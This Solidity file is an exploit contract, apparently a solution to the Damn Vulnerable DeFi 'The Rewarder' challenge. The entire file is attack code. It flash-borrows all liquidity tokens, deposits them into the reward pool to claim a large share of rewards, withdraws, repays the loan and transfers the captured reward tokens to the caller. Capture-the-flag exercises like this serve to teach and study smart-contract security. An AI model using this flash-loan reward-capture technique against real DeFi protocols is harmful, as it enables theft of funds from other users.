// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";


contract Attacker {

    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;

    constructor(address _flashLoanerPoolAddress, address _rewarderPoolAddress, address _liquidityTokenAddress, address _rewardTokenAddrerss) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(_rewarderPoolAddress);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewardToken = RewardToken(_rewardTokenAddrerss);
    }

    function execution() public {
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint _amount) public {
        liquidityToken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        //rewarderPool.deposit(liquidityToken.balanceOf(address(this)));
        rewarderPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanerPool), _amount);
    }

    // function executionSecondStep() public {
    //     //rewarderPool.distributeRewards();
    //     rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    // }
}

